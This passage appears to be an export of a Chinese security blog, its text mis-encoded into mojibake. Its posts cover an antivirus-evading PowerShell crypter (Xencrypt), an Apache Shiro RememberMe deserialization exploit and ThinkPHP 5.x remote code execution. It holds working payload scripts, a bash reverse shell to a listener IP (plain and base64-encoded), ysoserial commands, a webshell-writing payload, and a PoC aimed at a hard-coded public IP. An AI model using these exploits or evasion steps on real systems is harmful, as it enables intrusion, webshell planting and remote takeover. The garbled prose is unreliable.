<h3 id="æ‰§è¡Œæ–¹å¼"><a href="#æ‰§è¡Œæ–¹å¼" class="headerlink" title="æ‰§è¡Œæ–¹å¼"></a>æ‰§è¡Œæ–¹å¼</h3><p>å°±æˆ‘è€Œè¨€ï¼Œæˆ‘æƒ³åˆ¶ä½œä¸€ä¸ªPowerShellå¯†ç å™¨ï¼Œå¯ä»¥æ— é™æœŸåœ°å¯¹å…¶è‡ªèº«è¿›è¡Œåˆ†å±‚ï¼Œä»¥è¿›ä¸€æ­¥ç»•è¿‡åŠ¨æ€AVï¼ˆæˆ‘å¯¹å…¶è¿›è¡Œäº†å¤šè¾¾500å±‚çš„æµ‹è¯•ï¼‰ï¼Œå› æ­¤<code>Invoke-Expression</code>å¾ˆè‡ªç„¶ï¼Œå› ä¸ºå®ƒæ—¢å¯ä»¥è¿”å›ä¹Ÿå¯ä»¥æ‰§è¡Œå­—ç¬¦ä¸²å€¼ã€‚æœ€ç»ˆï¼Œæ‚¨é€‰æ‹©çš„å†…å®¹æ— å…³ç´§è¦ï¼Œä»…æ”¹å˜æ‚¨å¿…é¡»å‡†å¤‡çš„æœ‰æ•ˆè½½è·çš„æ–¹å¼ã€‚</p>
<p>ã€‚ã€‚ã€‚ã€‚</p>
<p>è¯¦æƒ…è¯·å‚è€ƒåŸæ–‡é“¾æ¥ï¼Œå› ä¸ºæˆ‘ä¸å¤ªæ‡‚ï¼š<span class="exturl" data-url="aHR0cHM6Ly9uZXRzZWMuZXhwZXJ0LzIwMjAvMDIvMDYvd3JpdGUtYS1jcnlwdGVyLWluLWFueS1sYW5ndWFnZS5odG1s">https://netsec.expert/2020/02/06/write-a-crypter-in-any-language.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="ä½¿ç”¨æ–¹å¼"><a href="#ä½¿ç”¨æ–¹å¼" class="headerlink" title="ä½¿ç”¨æ–¹å¼"></a>ä½¿ç”¨æ–¹å¼</h2><ul>
<li>é¦–å…ˆä¸‹è½½åˆ°æœ¬åœ°ï¼š</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/the-xentropy/xencrypt.git</span><br></pre></td></tr></table></figure>

<ul>
<li>å…³é—­ç”µè„‘æ€æ¯’è½¯ä»¶</li>
<li>åˆ‡æ¢åˆ°æ–‡ä»¶å¤¹ä¸­,å¯¼å…¥æ¨¡å—ä½¿ç”¨å³å¯ã€‚ï¼ˆ -iterations N æŒ‡å®šå‹ç¼©å’ŒåŠ å¯†æ¬¡æ•°ï¼‰</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> xencrupt.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Xencrypt</span> <span class="literal">-infile</span> C:\Users\windows\Desktop\sherlock.ps1 <span class="literal">-outfile</span> sherk.ps1 <span class="literal">-iterations</span> <span class="number">11</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>å·¥å…·ä½¿ç”¨</category>
      </categories>
      <tags>
        <tag>å…æ€</tag>
        <tag>å·¥å…·</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro RememberMeååºåˆ—åŒ–</title>
    <url>/posts/61f8a63d/</url>
    <content><![CDATA[<p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚ä½¿ç”¨Shiroçš„æ˜“äºç†è§£çš„API,å¯ä»¥å¿«é€Ÿã€è½»æ¾åœ°è·å¾—ä»»ä½•åº”ç”¨ç¨‹åº,ä»æœ€å°çš„ç§»åŠ¨åº”ç”¨ç¨‹åºåˆ°æœ€å¤§çš„ç½‘ç»œå’Œä¼ä¸šåº”ç”¨ç¨‹åºã€‚å®ƒç¼–å·ä¸º550çš„ issue ä¸­çˆ†å‡ºäº†ä¸¥é‡çš„ Java ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<a id="more"></a>

<h1 id="shiro-RememberMeååºåˆ—åŒ–"><a href="#shiro-RememberMeååºåˆ—åŒ–" class="headerlink" title="shiro RememberMeååºåˆ—åŒ–"></a>shiro RememberMeååºåˆ—åŒ–</h1><p>å‚è€ƒï¼š</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGFwZXJwZW4vcC8xMTMxMjY3MS5odG1s">https://www.cnblogs.com/paperpen/p/11312671.html<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvS2tXTDlTZnRDWlNka2dsVzM5UXcwUQ==">https://mp.weixin.qq.com/s/KkWL9SftCZSdkglW39Qw0Q<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚ä½¿ç”¨Shiroçš„æ˜“äºç†è§£çš„API,å¯ä»¥å¿«é€Ÿã€è½»æ¾åœ°è·å¾—ä»»ä½•åº”ç”¨ç¨‹åº,ä»æœ€å°çš„ç§»åŠ¨åº”ç”¨ç¨‹åºåˆ°æœ€å¤§çš„ç½‘ç»œå’Œä¼ä¸šåº”ç”¨ç¨‹åºã€‚å®ƒç¼–å·ä¸º550çš„ issue ä¸­çˆ†å‡ºäº†ä¸¥é‡çš„ Java ååºåˆ—åŒ–æ¼æ´ã€‚</p>
<h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Apache Shiro &lt;=1.2.4</span><br></pre></td></tr></table></figure>

<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><ul>
<li>Docker</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<h2 id="å‡†å¤‡æ¡ä»¶"><a href="#å‡†å¤‡æ¡ä»¶" class="headerlink" title="å‡†å¤‡æ¡ä»¶"></a>å‡†å¤‡æ¡ä»¶</h2><h3 id="Payloadç”Ÿæˆè„šæœ¬"><a href="#Payloadç”Ÿæˆè„šæœ¬" class="headerlink" title="Payloadç”Ÿæˆè„šæœ¬"></a>Payloadç”Ÿæˆè„šæœ¬</h3><ul>
<li>å¦‚æœç¼ºå°‘æ¨¡å—ç›´æ¥PIPå®‰è£…å³å¯ã€‚<code>python2 shiro.py host:port1</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># No module named Crypto.Cipherï¼Œè¯·ç™¾åº¦/ã€‚ã€‚ã€‚</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.6-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.format(payload.decode())</span><br></pre></td></tr></table></figure>

<h3 id="åå¼¹è„šæœ¬"><a href="#åå¼¹è„šæœ¬" class="headerlink" title="åå¼¹è„šæœ¬"></a>åå¼¹è„šæœ¬</h3><ul>
<li>Bash/Powershell/Python/Perlä½¿ç”¨è¯¥åœ°å€åœ¨çº¿ç”Ÿæˆï¼š<span class="exturl" data-url="aHR0cDovL3d3dy5qYWNrc29uLXQuY2EvcnVudGltZS1leGVjLXBheWxvYWRzLmh0bWw=">http://www.jackson-t.ca/runtime-exec-payloads.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="Ysoserialå·¥å…·"><a href="#Ysoserialå·¥å…·" class="headerlink" title="Ysoserialå·¥å…·"></a>Ysoserialå·¥å…·</h3><ul>
<li>ä¸‹è½½å·¥å…·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gitã€€<span class="built_in">clone</span> https://github.com/frohoff/ysoserial.git</span><br><span class="line"><span class="built_in">cd</span> ysoserial</span><br><span class="line">mvn package -DskipTests <span class="comment"># å¦‚æœæ‰§è¡ŒæŠ¥é”™,è¯·å…ˆæ£€æŸ¥JAVAç‰ˆæœ¬ã€‚ysoserialä¸‹è½½ç›®å½•pom.xml</span></span><br><span class="line"><span class="comment"># æ£€æŸ¥è¯¥å¤„ç‰ˆæœ¬ä¸è‡ªå·±JAVAç‰ˆæœ¬ä¸€è‡´</span></span><br><span class="line">&lt;!-- maximize compatibility --&gt;</span><br><span class="line">	&lt;<span class="built_in">source</span>&gt;1.8&lt;/<span class="built_in">source</span>&gt;</span><br><span class="line">	&lt;target&gt;1.8&lt;/target&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆçš„å·¥å…·åœ¨target/ç›®å½•ä¸‹ysoserial-0.0.6-SNAPSHOT-all.jaræ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h3 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h3><ul>
<li>ä½¿ç”¨shirt.pyè„šæœ¬ç”ŸæˆPayloadã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ï€ ~/Desktop/tp_tools/POC â¯ python shiro.py 192.168.1.105:3333</span><br><span class="line">rememberMe=rHxvtUa4SmSR1qg4iLCPtHl7Xgn2Th81yXDL9YhkdQ96bwu/Ej/tIHCcUoiuqaRgv7+BrJn+pOnAmmxdE7eCXTB/m1hEDGesMy2WRntzd1u0WuDSO7VlgCs1/HlyuhUgLULdYY7E+LYrnI3D8ysJWBbVcixNaQky36WYz1DPcQpB/x2ntf8UTWHQ4lHpKbM51EjkKH2WPSil9aXxpq0eJYc2dH2kznP+IcGZJ/VzyT75lvmlyhLVZpUwIbaXj1fzy1Z+ywmeHg4yEqYZWOyrFqoDGxdsvEuQZDa4P4njLo7zjWYA9udX9LFCXyHiUShweAZLPTCEvArwYj61UxQpHuKN1YBGVtGz2bmxYIyYiJdFvE4vNUjU4ibK6WhAo5nrkEQ2w45JWc5UUpuKFGMcFg==</span><br></pre></td></tr></table></figure>

<ul>
<li>åœ¨çº¿ç”Ÿæˆåå¼¹è„šæœ¬</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1</span><br><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA1Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h3><ul>
<li>ä½¿ç”¨<code>ysoserial</code>ä¸­JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬3333ç«¯å£<code>æ³¨æ„è¿™é‡Œçš„ç«¯å£æ˜¯åˆšæ‰ç”ŸæˆrememberMeå€¼çš„ç«¯å£</code>ã€‚å†åŠ ä¸Šç”Ÿæˆçš„base64ç¼–ç è„šæœ¬ã€‚</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ï€ ~/Desktop/tp_tools/POC â¯ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections4 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA1Lzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å¼€å¯ç›‘å¬</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>

<h3 id="ç¬¬ä¸‰æ­¥"><a href="#ç¬¬ä¸‰æ­¥" class="headerlink" title="ç¬¬ä¸‰æ­¥"></a>ç¬¬ä¸‰æ­¥</h3><ul>
<li><p>è®¿é—®æœ¬åœ°80ç«¯å£(Dockerå·²ç»å¯åŠ¨äº†)ã€‚å‹¾é€‰Remember Meé€‰é¡¹ï¼Œç™»å½•ç³»ç»Ÿã€‚æˆ‘è¿™é‡Œæˆªå–çš„æ˜¯ç‚¹å‡»logoutï¼ˆå‚è€ƒåˆ«äººçš„æ— æ³•æŠ“åˆ°ï¼Œï¼Œå³ä¾¿æ˜¯è‡ªå·±æ‰‹åŠ¨æ·»åŠ ä¸èµ·ä½œç”¨ï¼Œæ— æ³•åå¼¹ã€‚ï¼‰</p>
</li>
<li><p>å°†ç¬¬ä¸€æ­¥ç”Ÿæˆçš„<code>Remember Me</code>Payloadæ›¿æ¢åˆ°æˆªå–çš„è¯·æ±‚åŒ…ä¸­ã€‚å‘é€å³å¯ã€‚</p>
</li>
</ul>
<p>å…¶ä»–åˆ©ç”¨å·¥å…·è¯·å‚è€ƒ<code>å®½å­—èŠ‚å®‰å…¨</code>å…¬ä¼—å·ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>æ¼æ´å¤ç°</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.x è¿œç¨‹ä»£ç æ‰§è¡Œ</title>
    <url>/posts/8724785f/</url>
    <content><![CDATA[<p>ThinkPHP 5.xç‰ˆæœ¬æ˜¯å®˜æ–¹äº2015å¹´å‘å¸ƒçš„æ–°ä¸€ä»£æ¡†æ¶ï¼Œå…¶ä¸­5.0ç‰ˆæœ¬äº2016å¹´çš„9æœˆä»½å¸ƒã€‚ThinkPHP 5.xç‰ˆæœ¬æ›å‡ºå¤šä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<a id="more"></a>

<h1 id="ThinkPHP-5-x-ä»£ç æ‰§è¡Œ"><a href="#ThinkPHP-5-x-ä»£ç æ‰§è¡Œ" class="headerlink" title="ThinkPHP 5.x ä»£ç æ‰§è¡Œ"></a>ThinkPHP 5.x ä»£ç æ‰§è¡Œ</h1><ul>
<li>GETï¼šæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„getshellæ¼æ´ã€‚</li>
<li>POSTï¼šæœ¬æ¬¡æ¼æ´è§¦å‘ç‚¹åœ¨Request.phpæ–‡ä»¶é‡Œçš„methodæ–¹æ³•ä¸­ï¼Œè¯¥æ–¹æ³•çš„åŠŸèƒ½ä¸»è¦æ˜¯åˆ¤æ–­è¯·æ±‚ç±»å‹ã€‚</li>
</ul>
<h2 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>ç›®å‰æ¼æ´å½±å“ç‰ˆæœ¬å·åŒ…æ‹¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">5.</span>x &lt; <span class="number">5.1</span><span class="number">.31</span>, &lt;= <span class="number">5.0</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>

<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>ç›®å‰æ¼æ´å½±å“ç‰ˆæœ¬å·åŒ…æ‹¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">5.</span>x &lt;= <span class="number">5.0</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸‹åŸºäºThinkPHP 5 äºŒæ¬¡å¼€å‘çš„å†…å®¹ç®¡ç†ç³»ç»Ÿï¼Œå¾ˆå¯èƒ½å—åˆ°è¯¥æ¼æ´å½±å“ï¼Œå»ºè®®å‚å•†åŠæ—¶æ›´æ–°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AdminLTEåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">layuiåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">thinkcmf</span><br><span class="line">H-ui.adminåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">tpshop</span><br><span class="line">FsatAdmin</span><br><span class="line">eyoucms</span><br><span class="line">LarryCMSåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">tpadminåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">snakeåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">ThinkSNS</span><br><span class="line">DolphinPHPåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">WeMallå•†åŸç³»ç»Ÿ</span><br><span class="line">CLTPHP</span><br><span class="line">é½åšCMS</span><br><span class="line">DSMALL</span><br><span class="line">YFCMF</span><br><span class="line">HisiPHPåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">Tplayåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">lyadminåå°ç®¡ç†ç³»ç»Ÿ</span><br><span class="line">haoidåå°ç®¡ç†ç³»ç»Ÿ</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>GETå’ŒPOSTæ–¹å¼ä¸ºä¸¤ç§ä¸åŒçš„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<h3 id="POC-Getæ–¹å¼"><a href="#POC-Getæ–¹å¼" class="headerlink" title="POC Getæ–¹å¼"></a>POC Getæ–¹å¼</h3><ul>
<li>ThinkPHP5-RCE Version: 5.0.20/5.1.29/5.0.21/5.0.22/</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span>  <span class="comment"># éªŒè¯ æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">    poc1 = <span class="string">&#x27;/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1&#x27;</span></span><br><span class="line">    poc2 = <span class="string">&#x27;/index.php?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100&#x27;</span></span><br><span class="line">    cmd = <span class="string">&#x27;/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&#x27;</span></span><br><span class="line">    shell = <span class="string">&#x27;/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=&lt;?php @eval($_POST[c]);?&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url+poc1)</span><br><span class="line">        <span class="keyword">if</span> response.status_code ==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;SERVER_NAME&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;PayLoad : \n&#123;0&#125;\n&#123;1&#125;\n&#123;2&#125;\n&#123;3&#125;&#x27;</span>.format(poc1,poc2,cmd,shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = requests.get(url+poc2)</span><br><span class="line">            <span class="keyword">if</span> response.status_code ==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;SERVER_NAME&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;PayLoad : \n&#123;0&#125;\n&#123;1&#125;\n&#123;2&#125;&#x27;</span>.format(poc2,cmd,shell)</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">str</span>):</span> <span class="comment">#æ”»å‡»æ¨¡å—</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">c = poc(<span class="string">&#x27;https://39.105.137.230/&#x27;</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<h3 id="POC-POSTæ–¹å¼"><a href="#POC-POSTæ–¹å¼" class="headerlink" title="POC POSTæ–¹å¼"></a>POC POSTæ–¹å¼</h3><ul>
<li>5.x &lt;= 5.0.23</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST data:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span>  <span class="comment"># éªŒè¯ æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url + <span class="string">&#x27;/index.php?s=captcha&#x27;</span></span><br><span class="line">    data = <span class="string">&#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo 44899742450bdb319a869ed7438a61c6&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0(X11;Linuxx86_64;rv:67.0)Gecko/20100101 Firefox/67.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip,deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080//index.php?s=captcha0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;JSESSIONID=F7494C874B4E613FB6E023109349554A&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;192.168.201.21&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    url = url + <span class="string">&#x27;/index.php?s=captcha&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span>  response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;44899742450bdb319a869ed7438a61c6&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;å­˜åœ¨ThinkPHP5-RCE&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">str</span>):</span> <span class="comment">#æ”»å‡»æ¨¡å—</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">s = poc(url)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>

<p>å…·ä½“çš„ç‰ˆæœ¬å·²å®é™…æµ‹è¯•ä¸ºå‡†ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´å¤ç°</category>
      </categories>
      <tags>
        <tag>ThinkPHP</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>çˆ†ç ´å°æ–‡</title>
    <url>/posts/5b1d52cc/</url>
    <content><![CDATA[<p>çˆ†ç ´ä¸èƒ½è¯´æ˜¯æœ€å¥½çš„ï¼Œä½†æ˜¯ï¼Œç¡®å®æ˜¯å¾ˆå¿«ä¹çš„ã€‚ã€‚ã€‚</p>
<a id="more"></a>

<h1 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h1><ul>
<li>å²æœˆå®‰å¥½ï¼Œä½†æ˜¯æ€»æœ‰äº›ä¸å¤ªå¯¹çš„åœ°æ–¹ï¼Œæ”¹å¥½å¯†ç ï¼Œå¸¸æ”¹å¯†ç ï¼Œå¥åº·ä½ æˆ‘ä»–ï½</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9tb25pdG9yLmZpcmVmb3guY29tLw==">https://monitor.firefox.com/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v">https://haveibeenpwned.com/<i class="fa fa-external-link-alt"></i></span></p>
